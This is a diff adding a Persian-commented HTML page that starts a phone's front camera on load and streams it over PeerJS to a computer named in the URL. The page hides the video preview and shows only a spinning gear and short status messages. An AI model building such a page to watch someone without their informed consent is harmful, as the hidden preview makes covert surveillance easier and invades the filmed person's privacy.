@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title></title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            -webkit-user-select: none;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
+        
+        body {
+            background: #000000;
+            height: 100vh;
+            overflow: hidden;
+        }
+        
+        #gear {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            font-size: 140px;
+            color: #333333;
+            animation: spin 2s linear infinite;
+            filter: brightness(0.6);
+        }
+        
+        @keyframes spin {
+            0% { transform: translate(-50%, -50%) rotate(0deg); }
+            100% { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+        
+        video {
+            display: none;
+            position: absolute;
+            top: -9999px;
+        }
+        
+        #status {
+            position: absolute;
+            bottom: 30px;
+            width: 100%;
+            text-align: center;
+            color: #666666;
+            font-size: 14px;
+            font-family: Arial;
+        }
+        
+        .hidden {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- فقط این نمایش داده می‌شود -->
+    <div id="gear">⚙️</div>
+    <div id="status">در حال اتصال...</div>
+    
+    <!-- عناصر مخفی -->
+    <video id="localVideo" autoplay playsinline muted></video>
+    <div id="connectionInfo" class="hidden"></div>
+    
+    <script src="https://unpkg.com/peerjs@1.4.7/dist/peerjs.min.js"></script>
+    <script>
+        // متغیرها
+        let localStream = null;
+        let peer = null;
+        let connection = null;
+        let computerPeerId = null;
+        
+        // شروع خودکار
+        initialize();
+        
+        async function initialize() {
+            try {
+                // ۱. فعال کردن دوربین
+                await startCamera();
+                
+                // ۲. دریافت ID کامپیوتر از URL
+                computerPeerId = getComputerIdFromURL();
+                if (!computerPeerId) {
+                    showStatus('لطفاً از کامپیوتر به این صفحه بیایید');
+                    return;
+                }
+                
+                // ۳. اتصال به PeerJS سرور
+                await connectToPeerServer();
+                
+                // ۴. برقراری تماس با کامپیوتر
+                await callComputer();
+                
+            } catch (error) {
+                showStatus('خطا در راه‌اندازی');
+                console.error('Initialize error:', error);
+            }
+        }
+        
+        async function startCamera() {
+            try {
+                showStatus('فعال کردن دوربین...');
+                
+                localStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: 'user',
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 },
+                        frameRate: { ideal: 30 }
+                    },
+                    audio: false
+                });
+                
+                const videoElement = document.getElementById('localVideo');
+                videoElement.srcObject = localStream;
+                
+                showStatus('دوربین فعال ✓');
+                
+                // جلوگیری از sleep صفحه
+                if ('wakeLock' in navigator) {
+                    try {
+                        await navigator.wakeLock.request('screen');
+                    } catch (e) {}
+                }
+                
+            } catch (error) {
+                showStatus('خطا در دوربین');
+                throw error;
+            }
+        }
+        
+        function connectToPeerServer() {
+            return new Promise((resolve, reject) => {
+                showStatus('در حال اتصال به سرور...');
+                
+                // اتصال به PeerJS سرور خودمان
+                peer = new Peer({
+                    host: window.location.hostname,
+                    port: window.location.port || 443,
+                    path: '/peerjs',
+                    debug: 3
+                });
+                
+                peer.on('open', (id) => {
+                    console.log('📱 Phone Peer ID:', id);
+                    showStatus('اتصال برقرار ✓');
+                    resolve();
+                });
+                
+                peer.on('error', (error) => {
+                    console.error('Peer error:', error);
+                    showStatus('خطا در اتصال');
+                    reject(error);
+                });
+                
+                // اگر بعد از 10 ثانیه وصل نشد
+                setTimeout(() => {
+                    if (!peer.id) {
+                        showStatus('اتصال timeout');
+                        reject(new Error('Connection timeout'));
+                    }
+                }, 10000);
+            });
+        }
+        
+        async function callComputer() {
+            showStatus('در حال تماس با کامپیوتر...');
+            
+            try {
+                // تماس با کامپیوتر
+                connection = peer.call(computerPeerId, localStream);
+                
+                connection.on('stream', (remoteStream) => {
+                    // stream دریافتی را نادیده بگیر (ما فقط ارسال می‌کنیم)
+                    showStatus('📡 در حال ارسال تصویر...');
+                });
+                
+                connection.on('close', () => {
+                    showStatus('اتصال قطع شد');
+                });
+                
+                connection.on('error', (error) => {
+                    console.error('Connection error:', error);
+                    showStatus('خطا در ارتباط');
+                });
+                
+                // تأیید اتصال
+                setTimeout(() => {
+                    if (connection.open) {
+                        showStatus('✅ متصل به کامپیوتر');
+                    }
+                }, 2000);
+                
+            } catch (error) {
+                showStatus('خطا در تماس');
+                console.error('Call error:', error);
+            }
+        }
+        
+        function getComputerIdFromURL() {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('id');
+        }
+        
+        function showStatus(message) {
+            document.getElementById('status').textContent = message;
+        }
+        
+        // وقتی صفحه بسته می‌شود
+        window.addEventListener('beforeunload', () => {
+            if (localStream) {
+                localStream.getTracks().forEach(track => track.stop());
+            }
+            if (connection) {
+                connection.close();
+            }
+            if (peer) {
+                peer.destroy();
+            }
+        });
+        
+        // جلوگیری از کشیدن به پایین برای refresh
+        document.addEventListener('touchmove', (e) => {
+            if (e.touches.length > 1) {
+                e.preventDefault();
+            }
+        }, { passive: false });
+        
+    </script>
+</body>
+</html>
